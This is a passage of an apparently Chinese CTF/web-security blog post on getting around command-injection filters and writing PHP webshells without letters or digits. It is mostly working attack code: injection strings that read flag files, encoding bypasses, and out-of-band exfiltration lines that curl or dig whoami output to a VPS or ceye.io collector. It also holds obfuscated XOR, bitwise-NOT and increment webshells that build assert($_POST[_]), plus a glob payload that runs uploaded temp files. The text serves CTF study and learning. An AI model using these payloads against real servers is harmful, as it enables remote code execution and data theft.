title="空格被过滤"></a>空格被过滤</h3><ul><li><p>常见绕过方式有利用URL编码：%20、%09（tab）</p></li><li><p>还有利用<code>$IFS$9</code>、<code>$IFS$1</code>、<code>$&#123;IFS&#125;</code>、<code>$IFS</code>等内部域分隔符（也是IFS的一种，因此没有双引号包裹时被echo会被空格替换）</p></li><li><p>{}也可以，比如这样{cat,flag}</p></li><li><p>&lt; 、&lt;&gt;</p></li></ul><blockquote><p>IFS 是一种 set 变量，当 shell 处理”命令替换”和”参数替换”时，shell 根据 IFS 的值，默认是 space, tab, newline 来拆解读入的变量，然后对特殊字符进行处理，最后重新组合赋值给该变量。</p><p>IFS默认值为 <space> <tab> <newline>3个</p><p>IFS的作用就是把字符串里的某某字符（和它一样的字符）转义成分隔符。</p><p>而空格被当作分隔符时会合并，因此直接echo含多个空格的变量，会去重连续的空格，若要保留，echo时加上双引号</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;$test&quot;</span><br></pre></td></tr></table></figure></div><p>可以对IFS重新赋值</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">IFS=&#x27;&amp;&#x27;</span><br><span class="line">STRING2=&quot;111&amp;222&amp;&amp;333&amp;&amp;&amp;444&quot;</span><br><span class="line">echo $STRING2   # 111 222  333   444     (没有双引号包裹，分隔符以空格显示)</span><br><span class="line">echo &quot;$STRING2&quot;   # 111&amp;222&amp;&amp;333&amp;&amp;&amp;444</span><br></pre></td></tr></table></figure></div></blockquote><blockquote><p>$* 指的是脚本入口参数的字符串集，是一个全局变量</p><p>你在终端输入一个脚本，带了3个参数：</p><p><strong># .&#x2F;script 111 222 333</strong></p><p>那么 echo $* 输出的就是111 222 333</p><p>而$*等于111IFS222IFS333IFS444 所以会根据IFS值改变结果</p></blockquote><h3 id="某些关键字被过滤"><a href="#某些关键字被过滤" class="headerlink" title="某些关键字被过滤"></a>某些关键字被过滤</h3><h4 id="base64编码绕过"><a href="#base64编码绕过" class="headerlink" title="base64编码绕过"></a>base64编码绕过</h4><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Y2F0IC9mbGFn&quot;</span>|base64 -d|bash     <span class="comment">//cat /flag</span></span><br></pre></td></tr></table></figure></div><h4 id="引号绕过"><a href="#引号绕过" class="headerlink" title="引号绕过"></a>引号绕过</h4><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ph<span class="string">&quot;&quot;</span>p  =&gt;  php</span><br><span class="line">ca<span class="string">&#x27;&#x27;</span>t  =&gt;  cat</span><br><span class="line">ca``t  =&gt;  cat</span><br></pre></td></tr></table></figure></div><h4 id="偶读拼接绕过"><a href="#偶读拼接绕过" class="headerlink" title="偶读拼接绕过"></a>偶读拼接绕过</h4><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=<span class="number">192.168</span>.<span class="number">0.1</span>;a=l;b=s;$a<span class="variable">$b</span> <span class="comment">//ls</span></span><br></pre></td></tr></table></figure></div><h4 id="反斜杠-绕过"><a href="#反斜杠-绕过" class="headerlink" title="反斜杠 \ 绕过"></a>反斜杠 \ 绕过</h4><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ca\t =&gt; cat</span><br><span class="line">fl\ag =&gt; flag</span><br><span class="line">ph\p =&gt; php</span><br></pre></td></tr></table></figure></div><h4 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="通配符绕过"></a>通配符绕过</h4><p>[<a class="link"   href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" >无字母数字webshell之提高篇 | 离别歌 (leavesongs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>]</p><p><a class="link"   href="https://www.freebuf.com/articles/network/279563.html" >[老生常谈的无字母数字 Webshell 总结 - FreeBuf网络安全行业门户] <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">shell下可以利用.来执行任意脚本</span><br><span class="line">Linux文件名支持用glob通配符代替</span><br><span class="line">/?url=<span class="number">192.168</span>.<span class="number">0.1</span>|cat%<span class="number">09</span>/fla?</span><br><span class="line">/?url=<span class="number">192.168</span>.<span class="number">0.1</span>|cat%<span class="number">09</span>/fla*</span><br><span class="line">假设flag在/flag中:</span><br><span class="line">/?url=<span class="number">127.0</span>.<span class="number">0.1</span>|ca<span class="string">&quot;&quot;</span>t%<span class="number">09</span>/fla?</span><br><span class="line">/?url=<span class="number">127.0</span>.<span class="number">0.1</span>|ca<span class="string">&quot;&quot;</span>t%<span class="number">09</span>/fla*</span><br><span class="line">    </span><br><span class="line">假设flag在/flag.txt中:</span><br><span class="line">/?url=<span class="number">127.0</span>.<span class="number">0.1</span>|ca<span class="string">&quot;&quot;</span>t%<span class="number">09</span>/fla????</span><br><span class="line">/?url=<span class="number">127.0</span>.<span class="number">0.1</span>|ca<span class="string">&quot;&quot;</span>t%<span class="number">09</span>/fla*</span><br><span class="line">    </span><br><span class="line">假设flag在/flags/flag.txt中:</span><br><span class="line">/?url=<span class="number">127.0</span>.<span class="number">0.1</span>|ca<span class="string">&quot;&quot;</span>t%<span class="number">09</span>/fla??/fla????</span><br><span class="line">/?url=<span class="number">127.0</span>.<span class="number">0.1</span>|ca<span class="string">&quot;&quot;</span>t%<span class="number">09</span>/fla*/fla*</span><br><span class="line">  </span><br><span class="line">/bin/ca? a*Hello!</span><br></pre></td></tr></table></figure></div><blockquote><p>这里要注意，你使用的命令补全时会不会存在歧义，比如ca补全时，三个字母的有<code>cal</code>和<code>cat</code>两种</p><p>cal的路径和cat的路径完全不一样，这也是这里为什么要指定路径的缘故</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032329169.jpg"                      alt="image-20220815032641305"                ><figcaption>image-20220815032641305</figcaption></figure></p></blockquote><p><strong>Hex编码绕过</strong></p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;636174202f666c6167&quot;|xxd -r -p|bash     将执行cat /flag</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">(<span class="built_in">printf</span> <span class="string">&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;</span>)         执行<span class="built_in">cat</span> /flag</span></span><br><span class="line">&#123;printf,&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;&#125;|$0       执行cat /flag</span><br></pre></td></tr></table></figure></div><p><strong>Oct编码绕过</strong></p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">(<span class="built_in">printf</span> <span class="string">&quot;\154\163&quot;</span>)       执行<span class="built_in">ls</span></span></span><br></pre></td></tr></table></figure></div><p><strong>内联执行绕过</strong></p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;a`pwd`&quot;          #输出a/root</span><br><span class="line">?ip=127.0.0.1;cat$IFS$9`ls`</span><br></pre></td></tr></table></figure></div><p><strong>[]匹配绕过</strong></p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c[a]t  =&gt;  cat</span><br><span class="line">mo[r]e  =&gt;  more  </span><br><span class="line">in[d]ex  =&gt;  index</span><br><span class="line">p[h]p  =&gt;  php</span><br></pre></td></tr></table></figure></div><h4 id="字符串拼接"><a href="#字符串拼接" class="headerlink" title="字符串拼接"></a>字符串拼接</h4><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=c;b=at;c=a;d=txt;$a$b $c.$da=c;b=at;c=a;d=txt;$a$b $&#123;c&#125;.$&#123;d&#125;  # cat a.txt</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Hello!</span></span><br></pre></td></tr></table></figure></div><h4 id="利用环境变量取值"><a href="#利用环境变量取值" class="headerlink" title="利用环境变量取值"></a><strong>利用环境变量取值</strong></h4><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032329605.jpg"                      alt="image-20220815031943830"                ><figcaption>image-20220815031943830</figcaption></figure></p><blockquote><p>:3:1  下标为3的字符开始打印一个字符，总的也是一个字符，下标从0开始</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sh-3.2# echo $&#123;SHELLOPTS&#125;</span><br><span class="line">braceexpand:emacs:hashall:histexpand:history:interactive-comments:monitor:posix</span><br><span class="line">sh-3.2# echo $&#123;SHELLOPTS:1:10&#125;</span><br><span class="line">raceexpand</span><br></pre></td></tr></table></figure></div></blockquote><h4 id="使用空变量"><a href="#使用空变量" class="headerlink" title="使用空变量"></a><strong>使用空变量</strong></h4><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c<span class="variable">$&#123;z&#125;</span>at a.txt</span><br></pre></td></tr></table></figure></div><h4 id="无回显绕过"><a href="#无回显绕过" class="headerlink" title="无回显绕过"></a>无回显绕过</h4><p>外带信息，访问vps,然后去日志中查找</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl vps:port/`whoami`</span><br></pre></td></tr></table></figure></div><p>或者加上编码也可</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 34kk35.ceye.io/$(<span class="built_in">whoami</span> | <span class="built_in">base64</span>)</span><br></pre></td></tr></table></figure></div><p><strong>使用DNS</strong></p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig `<span class="built_in">whoami</span>`.34kk35.ceye.io</span><br></pre></td></tr></table></figure></div><h2 id="无数字字母shell"><a href="#无数字字母shell" class="headerlink" title="无数字字母shell"></a>无数字字母shell</h2><h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>过滤了数字字母大小写，无法正常传一句话</p></blockquote><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>将非字母、数字的字符经过各种变换，最后能构造出a-z中任意一个字符。然后再利用PHP允许动态函数执行的特点，拼接处一个函数名，如“assert”，然后动态执行之即可</p><ul><li>php5中assert是一个函数，我们可以通过<code>$f=&#39;assert&#39;;$f(...);</code>这样的方法来动态执行任意代码。</li><li>但php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。但也无需过于担心，比如我们利用file_put_contents函数，同样可以用来getshell。</li></ul><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到a-z中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%01&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%13&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%13&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%12&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%14&#x27;</span>^<span class="string">&#x27;`&#x27;</span>); <span class="comment">// $_=&#x27;assert&#x27;;</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%2F&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;]&#x27;</span>); <span class="comment">// $__=&#x27;_POST&#x27;;</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$$__</span>;</span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]); <span class="comment">// assert($_POST[_]);</span></span><br></pre></td></tr></table></figure></div><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>使用的是位运算里的“取反”，利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如<code>&#39;和&#39;&#123;2&#125;</code>的结果是<code>&quot;\x8c&quot;</code>，其取反即为字母<code>s</code>：</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/e6c9d24ely1h5802luzjqj209y0bejrs.jpg"                      alt="img"                ><figcaption>img</figcaption></figure></p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$__</span>=(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>)+(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>);</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$__</span>/<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$___</span>=<span class="string">&quot;瞰&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;和&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;和&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;的&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;半&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;始&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable">$_____</span>=<span class="string">&#x27;_&#x27;</span>;<span class="variable">$___</span>=<span class="string">&quot;俯&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;瞰&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;次&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;站&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$_____</span>;</span><br><span class="line"><span class="variable">$____</span>(<span class="variable">$_</span>[<span class="variable">$__</span>]);</span><br></pre></td></tr></table></figure></div><blockquote><p>这个答案还利用了PHP的弱类型特性。因为要获取<code>&#39;和&#39;&#123;2&#125;</code>，就必须有数字2。而PHP由于弱类型这个特性，true的值为1，故<code>true+true==2</code>，也就是<code>(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)==2</code>。</p></blockquote><h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/e6c9d24ely1h5802lcnxij20i2027jrj.jpg"                      alt="14872693882387.jpg"                ><figcaption>14872693882387.jpg</figcaption></figure></p><p>也就是说，<code>&#39;a&#39;++ =&gt; &#39;b&#39;</code>，<code>&#39;b&#39;++ =&gt; &#39;c&#39;</code>… 所以，我们只要能拿到一个变量，其值为<code>a</code>，通过自增操作即可获得a-z中所有字符。</p><h4 id="获取字母a"><a href="#获取字母a" class="headerlink" title="获取字母a"></a>获取字母a</h4><p>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为<code>Array</code>,再取这个字符串的第一个字母，就可以获得’A’了。</p><p>利用这个技巧，编写了如下webshell（因为PHP函数是大小写不敏感的，所以我们最终执行的是<code>ASSERT($_POST[_])</code>，无需获取小写a）：</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="variable">$_</span>=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>; <span class="comment">// $_=&#x27;Array&#x27;;</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>]; <span class="comment">// $_=$_[0];</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>; <span class="comment">// A</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// E </span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// R</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// P</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// O</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$____</span>;</span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]); <span class="comment">// ASSERT($_POST[_]);</span></span><br></pre></td></tr></table></figure></div><h2 id="无数字字母shell提高篇"><a href="#无数字字母shell提高篇" class="headerlink" title="无数字字母shell提高篇"></a>无数字字母shell提高篇</h2><p>多了两个限制：</p><ol><li>webshell长度不超过35位</li><li>除了不包含字母数字，还不能包含<code>$</code>和<code>_</code></li></ol><h3 id="PHP7下"><a href="#PHP7下" class="headerlink" title="PHP7下"></a>PHP7下</h3><p>执行动态函数<code>($a)();</code> (PHP7后支持)</p><p>e.g. <code>(&#39;phpinfo&#39;)();</code></p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F%<span class="number">96</span>%<span class="number">91</span>%<span class="number">99</span>%<span class="number">90</span>)(); <span class="comment">//phpinfo()</span></span><br></pre></td></tr></table></figure></div><h3 id="PHP5下"><a href="#PHP5下" class="headerlink" title="PHP5下"></a>PHP5下</h3><p>Linux shell知识点：</p><ol><li>shell下可以利用<code>.</code>来执行任意脚本</li><li>Linux文件名支持用glob通配符代替</li></ol><blockquote><p><code>. file</code>的意思就是用bash执行file文件中的命令</p></blockquote><p>Linux下的glob通配符：</p><ul><li><code>*</code>可以代替0个及以上任意字符</li><li><code>?</code>可以代表1个任意字符</li></ul><blockquote><p><code>/tmp/phpXXXXXX</code>就可以表示为<code>/*/?????????</code>或<code>/???/?????????</code>。</p></blockquote><p>但这种匹配的结果过多，假设要执行<code>/tmp/phpcjggLC</code></p><p>glob支持用<code>[^x]</code>的方法来构造“这个位置不是字符x”,那么，我们用这个姿势干掉<code>/bin/run-parts</code>：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/???/???[^-]?????</span><br></pre></td></tr></table></figure></div><p>跟正则表达式类似，glob支持利用<code>[0-9]</code>来表示一个范围</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032329195.jpg"                      alt="image-20220816023000185"                ><figcaption>image-20220816023000185</figcaption></figure></p><p>所有匹配到的文件名都是小写，只有PHP生成的临时文件包含大写字母。那么答案就呼之欲出了，我们只要找到一个可以表示“大写字母”的glob通配符，就能精准找到我们要执行的文件。</p><p>翻开ascii码表，可见大写字母位于<code>@</code>与<code>[</code>之间,我们可以利用<code>[@-[]</code>来表示大写字母</p><p>最终payload</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">?&gt;</span><span class="meta">&lt;?=</span>`. /???/????????[@-[]`;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><h2 id="无数字字母shell的一些trick"><a href="#无数字字母shell的一些trick" class="headerlink" title="无数字字母shell的一些trick"></a>无数字字母shell的一些trick</h2><h3 id="获取数字1-0"><a href="#获取数字1-0" class="headerlink" title="获取数字1 0"></a>获取数字1 0</h3><div 